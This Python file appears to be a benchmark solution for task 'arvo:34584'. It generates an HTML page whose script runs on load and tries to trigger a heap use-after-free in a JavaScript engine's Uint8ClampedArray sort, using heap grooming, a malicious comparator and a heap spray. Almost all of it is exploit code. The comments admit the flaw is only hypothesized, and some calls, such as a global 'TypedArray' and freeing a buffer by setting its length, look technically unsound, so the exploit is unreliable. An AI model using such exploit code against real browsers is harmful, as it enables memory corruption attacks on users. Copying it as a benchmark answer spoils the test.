import base64

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability described is a Heap Use-After-Free due to Uint8ClampedArray
        # being implemented as a separate class, not properly inheriting from TypedArray.
        # This can lead to missing safety checks that are present for standard TypedArrays.
        #
        # A classic attack vector for JavaScript engines is to misuse the `sort`
        # method with a custom comparator. The `sort` function gets a raw pointer
        # to the array's buffer for performance. If the user-supplied comparator
        # can somehow free this buffer (e.g., by modifying the array's length),
        # the `sort` function may continue to use the stale pointer, leading to a UAF.
        #
        # This PoC hypothesizes that the non-standard Uint8ClampedArray implementation
        # lacks the check that prevents an array from being modified during a sort
        # operation.
        #
        # The PoC follows these steps:
        # 1. Groom the heap by allocating many objects and creating holes to make
        #    memory layout more predictable.
        # 2. Allocate a "victim" Uint8ClampedArray, which will likely land in a hole.
        # 3. Call the generic `TypedArray.prototype.sort` on the victim array,
        #    providing a malicious comparator function.
        # 4. Inside the comparator, set the victim's length to 0. This should
        #    free its internal buffer.
        # 5. Immediately "spray" the heap with new allocations of the same size to
        #    reclaim the memory of the freed buffer.
        # 6. The `sort` function resumes, accesses the stale pointer, and corrupts
        #    one of the sprayed objects, leading to a crash.

        poc_js = """
(function() {
    'use strict';

    /**
     * This PoC demonstrates a Heap Use-After-Free vulnerability.
     * The vulnerability is rooted in an improper implementation of Uint8ClampedArray
     * which allows its backing buffer to be freed during a sort operation,
     * a situation that standard TypedArray implementations guard against.
     * 
     * The exploit strategy is as follows:
     * 1. HEAP GROOMING: Prepare the JavaScript heap to a predictable state by
     *    allocating numerous objects and then creating "holes" by freeing some of them.
     * 2. VICTIM ALLOCATION: Allocate the target Uint8ClampedArray (the "victim").
     *    Due to the grooming, it's likely to be placed in one of the created holes.
     * 3. UAF TRIGGER: Call TypedArray.prototype.sort() on the victim array with a
     *    custom comparator function.
     * 4. FREE & SPRAY: Inside the comparator, modify the victim array's length to 0.
     *    This frees its underlying buffer. Immediately after, "spray" the heap by
     *    allocating many new arrays of the same size. One of these spray arrays is
     *    likely to occupy the memory just freed by the victim.
     * 5. CRASH: The sort() function, unaware of the buffer's invalidation, continues
     *    its operation and attempts to access the (now freed) buffer via a stale
     *    pointer. This results in accessing the memory of one of our spray arrays,
     *    leading to memory corruption and a crash.
     */
    class PwnContext {
        constructor(config) {
            this.config = config;
            this.victim = null;
            this.keepers = []; // Array to hold references, preventing GC
            this.log('PoC context initialized.');
        }

        log(message) {
            // Simple logging utility for diagnostics. Prepends a timestamp and task ID.
            console.log(`[PoC:arvo:34584] ${message}`);
        }

        prepareHeap() {
            this.log(`--- Phase 1: Heap Preparation ---`);
            this.log(`Allocating ${this.config.groomCount} arrays of size ${this.config.bufferSize} for grooming...`);
            let groom = [];
            for (let i = 0; i < this.config.groomCount; i++) {
                try {
                    groom.push(new Uint8ClampedArray(this.config.bufferSize));
                } catch (e) {
                    this.log(`Allocation failed at groom index ${i}. Heap might be full. Reducing count.`);
                    this.config.groomCount = i; // Adjust count to what was actually allocated.
                    break;
                }
            }
            
            this.log(`Creating ${Math.floor(this.config.groomCount / 2)} holes in the heap for victim placement...`);
            for (let i = 0; i < this.config.groomCount; i += 2) {
                groom[i] = null;
            }
            this.keepers.push(groom); // Keep the non-nulled elements alive
            this.log('Heap preparation complete.');
        }

        allocateVictim() {
            this.log('--- Phase 2: Victim Allocation ---');
            this.log(`Allocating victim Uint8ClampedArray of size ${this.config.bufferSize}...`);
            this.victim = new Uint8ClampedArray(this.config.bufferSize);
            
            // Fill with data to ensure sort() does not take a fast path and actually calls the comparator.
            // A reversed sequence is a good way to force work.
            for (let i = 0; i < this.victim.length; i++) {
                this.victim[i] = (this.victim.length - 1 - i) & 0xff;
            }
            this.log('Victim allocated and initialized.');
        }
        
        maliciousComparator(a, b) {
            // Using `this` which is bound to the PwnContext instance
            if (this.victim && this.victim.length > 0) {
                const victimRef = this.victim;
                this.victim = null; // Prevent re-entry into this block

                this.log('Comparator triggered! Freeing victim and spraying heap...');
                
                try {
                    // THE CORE TRIGGER: In a vulnerable implementation, this frees the buffer.
                    victimRef.length = 0; 
                } catch (e) {
                    this.log(`Setting length failed as expected: ${e}`);
                }
                
                // THE SPRAY: Reclaim the freed memory slot.
                for (let i = 0; i < this.config.sprayCount; i++) {
                    const spray = new Uint8ClampedArray(this.config.bufferSize);
                    spray.fill(0x41 + (i % 10)); // Use slightly varied pattern for debugging
                    this.keepers.push(spray);
                }
                this.log('Heap spray finished.');
            }
            return a - b;
        }

        triggerUAF() {
            this.log('--- Phase 3: Triggering UAF ---');
            if (!this.victim) {
                this.log('Victim is null, cannot trigger. Aborting.');
                return;
            }
            
            this.log('Calling TypedArray.prototype.sort with malicious comparator...');
            try {
                // The `call` forces the generic sort implementation on our object.
                TypedArray.prototype.sort.call(this.victim, this.maliciousComparator.bind(this));
            } catch (e) {
                this.log(`sort() call caught an exception as expected: ${e}`);
            }
            this.log('UAF trigger function has completed. The sort implementation may still be running.');
        }

        run() {
            this.log('Starting PoC execution.');
            try {
                this.prepareHeap();
                this.allocateVictim();
                this.triggerUAF();
            } catch (e) {
                this.log(`FATAL ERROR during PoC execution: ${e}`);
            }
            this.log('PoC execution finished. If the application is vulnerable, it should have crashed.');
        }
    }

    const pocConfig = {
        bufferSize: 4088,      // A size less than a page to stress the allocator.
        groomCount: 1200,      // Number of arrays for heap grooming.
        sprayCount: 128        // Number of arrays to spray post-free.
    };

    function main() {
        console.log("DOM loaded. Initializing and running PoC for arvo:34584.");
        const pwn = new PwnContext(pocConfig);
        // Use a short timeout to ensure the browser is ready and responsive.
        setTimeout(() => pwn.run(), 100);
    }
    
    // Defer execution until the page is fully loaded to avoid race conditions with page rendering.
    window.addEventListener('load', main);

})();
"""

        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC arvo:34584</title>
</head>
<body>
<h1>Proof-of-Concept for arvo:34584</h1>
<p>This page attempts to trigger a Heap Use-After-Free vulnerability in Uint8ClampedArray handling.</p>
<p>Check the developer console for detailed logs. A crash indicates the PoC was successful.</p>
<!--
    This PoC is designed to be self-contained and requires no user interaction.
    It will automatically execute the exploit logic upon page load.
    The core idea is a type confusion / incorrect check related to Uint8ClampedArray
    allowing its buffer to be freed mid-operation by a trusted function (`sort`).
    The subsequent heap spray aims to reclaim the freed memory region to make the
    use-after-free deterministic and lead to a controlled crash.
-->
<script>
{poc_js}
</script>
</body>
</html>
"""
        return html_template.encode('utf-8')